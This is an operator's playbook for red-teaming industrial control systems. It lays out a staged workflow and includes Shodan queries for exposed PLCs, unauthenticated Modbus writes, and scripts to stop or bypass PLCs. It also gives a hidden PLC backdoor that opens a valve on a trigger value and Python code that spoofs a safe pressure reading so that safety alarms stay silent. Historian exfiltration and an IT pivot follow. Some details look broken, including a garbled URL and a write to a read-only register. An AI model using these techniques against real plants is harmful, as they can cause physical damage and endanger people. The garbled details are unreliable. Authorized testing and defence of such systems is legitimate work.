# CPS Attack Playbook

> Operator's playbook for red-teaming Cyber-Physical Systems. Walks through engagement scoping, lab setup, attack workflow, persistence, OT-to-IT pivot, and reporting. Target audience: experienced offensive operators already familiar with ICS protocols, OT networks, and the Purdue Model.

## 1. Engagement Scoping

### 1.1 Confirm scope

| Item | Detail |
|------|--------|
| Target PLC vendor / model | Siemens / Rockwell / Schneider / Mitsubishi |
| Allowed protocols | Modbus / EtherNet/IP / OPC UA / DNP3 / S7comm |
| Allowed attack stages | recon / initial-access / privesc / persistence |
| SIS bypass | yes / no (almost always NO) |
| Operations coordination | required (any write needs approval) |
| Out of scope | destructive process impact, SIS bypass, plant shutdown |
| Time window | |
| Communications channel | |

### 1.2 Rules of engagement

- **No destructive writes** — never write to actuator outputs that could cause physical damage
- **No PLC STOP** without explicit ops approval and engineer on standby
- **No SIS bypass** without C-level written approval and safety officer on-site
- **No active scanning** during production hours
- **Notify operator** before any write to a register
- **Pause testing** if any alarm trips

### 1.3 Test boundaries

- Allowed: passive capture, read-only register enumeration, OPC UA browse
- Allowed (with approval): read test on staging PLC, write to test register
- Disallowed: PLC STOP on production, SIS bypass, firmware modification

## 2. Pre-Engagement Recon

### 2.1 Network topology

```bash
# Identify OT network range (often 10.x.x.x or 172.16.x.x)
ip route

# Identify engineering workstation VLAN
arp -a

# Identify HMI / SCADA infrastructure
nmap -sn 10.0.0.0/24 --max-rate 5
```

### 2.2 Shodan / Censys (external)

```bash
# Find internet-exposed OT devices (often accidental exposure)
shodan search 'port:502 country:US'
shodan search 'port:44818 product:"Rockwell"'
shodan search 'port:102 product:"Siemens"'
shodan search 'port:4840 product:"OPC UA"'
shodan search 'port:47808 product:"BACnet"'
```

### 2.3 Vendor portal recon (legal OSINT)

```bash
# Vendor default credentials database
# - https://cirt.net/passwords
# - https://192-168-1-1ip.m
# Vendor CVE feeds
gh api /repos/siemens/cert/security-advisories
```

## 3. Lab Setup

### 3.1 Modbus PLC simulator

```bash
# OpenPLC (free, runs on Raspberry Pi)
git clone https://github.com/openplc/openplc_v3.git
cd openplc_v3
./install.sh rpi

# Modbus pal (Java simulator)
java -jar modbus_pal.jar
```

### 3.2 OPC UA server lab

```bash
# node-opcua
npm install node-opcua
node -e "
const { Server } = require('node-opcua');
const server = new Server();
server.start();
"

# Or unified-automation demo server
docker run -p 4840:4840 unified-automation/server
```

### 3.3 Conpot (ICS honeypot)

```bash
pip install conpot
conpot --template default --temp-dir /tmp/conpot
```

### 3.4 MiniCPS lab

```bash
pip install minicps
# Provides emulated PLC + sensors + actuators
```

### 3.5 Siemens S7 simulator

```bash
# Snap7 server (Windows / Linux)
snap7-server
# Listens on port 102, simulates S7-300
```

### 3.6 Rockwell EtherNet/IP simulator

```bash
# cpppo Python library has EtherNet/IP server
pip install cpppo
python3 -m cpppo.server.enip -v
```

## 4. Attack Workflow — Stage by Stage

### Stage 1 — Recon (4-8 hours)

**Goal**: produce OT target map.

```bash
# Passive capture (preferred)
tcpdump -i eth0 -w ot.pcap &

# Active recon (low-rate)
nmap -sn 10.0.0.0/24 -T1
nmap -sV --script=bacnet-info,enip-info,modbus-discover -p 502,44818,47808,20000,4840,102,2404 --max-rate 10 10.0.0.0/24
```

**Output**: `recon.md` with device inventory (vendor / model / firmware / IP / role).

### Stage 2 — Initial Access (1-3 days)

Try in order of cost:

1. **HMI web RCE** — common CVE chain
2. **Engineering workstation phishing** — TIA Portal project as lure
3. **Modbus unauth** — direct write to PLC
4. **Vendor remote support** — TeamViewer / vendor VPN
5. **OT-to-IT bridge** — DMZ host with both NICs

```bash
# Identify HMI web admin
for h in 10.0.0.{1..20}; do
  curl -sk -o /dev/null -w "%{http_code} https://$h/admin\n" https://$h/admin
done

# Try Modbus unauth
mbpoll -m tcp -a 1 -r 0 -c 10 10.0.0.5
```

### Stage 3 — Privilege Escalation (1-2 days)

From read-only → PLC STOP / program download:

```bash
# Find unprotected PLCs
nmap -p 102,502,44818 10.0.0.0/24

# Try Siemens S7 STOP
python3 kali_s7_stop.py --target 10.0.0.5

# Try Rockwell ControlLogix CVE-2024-6184
python3 kali_rockwell_bypass.py --target 10.0.0.5
```

### Stage 4 — Persistence (1 day)

Install 2-3 backdoors:

1. **Hidden function block** in PLC program (backdoor on specific input)
2. **Backdoor HMI user** (admin user with non-obvious name)
3. **Rogue OPC UA server** (MITM all OPC UA traffic)

```python
# Hidden function block (SCL)
# In OB1, add:
# IF "Digital_Input_100" = 1337 THEN
#     "Digital_Output_0" := TRUE;  # open valve
# END_IF;
```

### Stage 5 — Sensor Spoofing (4 hours)

```python
# Force Modbus input register to "safe" value
from pyModbusTCP.client import ModbusClient
c = ModbusClient(host='10.0.0.5', port=502)
c.open()
c.write_single_register(30001, 5000)  # spoof safe pressure
# Reality: 100 bar
# HMI shows 50 bar; SIS sees 50 bar; no alarm
```

### Stage 6 — Historian Exfil (1 day)

```bash
# Identify historian
nmap -p 1433,5450,14000 10.0.0.0/24

# Connect via SQL
sqsh -S historian -U hist_user -P REPLACE_WITH_YOUR_PW

# Bulk read
1> SELECT * FROM History WHERE Timestamp > '2024-01-01'
2> go
```

### Stage 7 — OT-to-IT Pivot (1 day)

```bash
# Engineering workstation dual-homed
ssh user@eng-station
ip addr show
# eth0: 10.0.0.10 (OT)
# eth1: 192.168.1.10 (IT)

# Pivot to IT
ssh user@192.168.1.50
```

### Stage 8 — Reporting (1-2 days)

Produce engagement report:
- Executive summary
- Findings (one per TC-CPS-XXX)
- Evidence package
- Detection rules
- Remediation roadmap

## 5. Common Pitfalls

### 5.1 Crashing PLCs with active scanning

OT devices are fragile. Aggressive nmap can crash PLCs.

**Fix**: Use `-T1 --max-rate 10`. Coordinate with ops. Test in staging first.

### 5.2 Forgetting to coordinate writes

Writes to live PLCs can cause process changes. Always notify operator.

**Fix**: Stand up an ops chat bridge. Confirm every write.

### 5.3 Misjudging SIS risk

SIS bypass can cause catastrophic damage. Never test SIS without explicit C-level approval and safety officer on-site.

**Fix**: Explicit written approval. Safety officer present. Test in lab first.

### 5.4 Over-stepping into IT

Pivoting to IT network often exceeds engagement scope.

**Fix**: Confirm scope. Stop at OT-IT boundary unless authorized.

### 5.5 Leaving backdoors in PLC programs

PLC program changes persist for years. Always document and cleanup.

**Fix**: Hash PLC programs before engagement. Restore from hash after.

## 6. Time Budget Cheat Sheet

| Engagement size | Recon | Initial access | Privesc | Persistence | Pivot | Reporting |
|-----------------|-------|----------------|---------|-------------|-------|-----------|
| Single PLC test | 2h | 4h | 4h | 2h | - | 1d |
| Single vendor estate | 4h | 1d | 1d | 1d | 4h | 1d |
| Multi-vendor site | 1d | 2d | 2d | 1d | 1d | 2d |
| Plant-wide engagement | 1d | 3d | 3d | 2d | 2d | 3d |

## 7. Tool Inventory

### 7.1 Offensive

| Tool | Purpose | Notes |
|------|---------|-------|
| `nmap` (ICS scripts) | Active recon | Low rate; OT fragile |
| `mbpoll` | Modbus client | Universal |
| `opcua-cli` | OPC UA client | Universal |
| `snap7` | Siemens S7comm | Python via snap7-python |
| `cpppo` | EtherNet/IP | Python |
| `plcscan` | PLC scanner | Vendor enumeration |
| `scapy` | Packet crafting | GOOSE, Profinet DCP |
| `wireshark` | Protocol analysis | With ICS dissectors |
| `zeek` | Traffic analysis | Industrial analyzers |
| `mitmproxy` | OPC UA MITM | |
| `claroty` / `dragos` / `nozomi` | Passive monitoring | Use for detection too |
| `redpoint` | Digital Bond ICS tools | |
| `mihari` | ICS fuzzer | |
| `conpot` | ICS honeypot | |

### 7.2 Detection development

| Tool | Purpose |
|------|---------|
| `zeek` industrial analyzers | modbus.log, dnp3.log, enip.log |
| Suricata ICS ruleset | Detect attacks |
| Claroty / Dragos / Nozomi | Baseline + anomaly |
| Sigma rules | SIEM detection pattern |

## 8. Engagement Quality Checklist

Before reporting complete:

- [ ] All in-scope protocols tested (Modbus, EtherNet/IP, OPC UA, etc.)
- [ ] Every PLC vendor covered (Siemens, Rockwell, Schneider)
- [ ] HMI web RCE tested
- [ ] Engineering workstation compromise attempted
- [ ] Historian compromise attempted
- [ ] OT-to-IT pivot attempted
- [ ] Persistence mechanism documented
- [ ] Detection rules authored for ≥3 findings
- [ ] Cleanup performed (PLC programs restored from hash)
- [ ] Customer debrief scheduled
- [ ] Final report delivered
- [ ] Operations handoff (notify of any backdoors left for testing)

## 9. References

- MITRE ATT&CK for ICS — https://collaborate.mitre.org/attackics/
- CISA ICS Advisories — https://www.cisa.gov/ics-advisories
- Dragos — Year in Review 2024
- Claroty — Top 50 ICS Vulnerabilities 2024
- Nozomi Networks — Industrial IoT Threat Landscape 2024
- Siemens CERT — https://cert-portal.siemens.com/
- Rockwell PSIRT — https://rockwellautomation.custhelp.com/
- Schneider CERT — https://www.se.com/ww/en/work/support/cybersecurity/security-notifications
- SANS ICS — https://ics.sans.org/
- "Industrial Network Security" (Knapp, Langill) 4th Edition 2024
- "Hacking Exposed ICS" (Pidgeon, 2024)
- NIST SP 800-82r3 — ICS Security Guide
- ANSI/ISA-99 / IEC 62443
- CISA AA23-335A — Unitronics PLC Attack
- CISA AA23-320A — Industroyer2
- Dragos — Pipedream / Incontroller
- Claroty — FrostyGoop
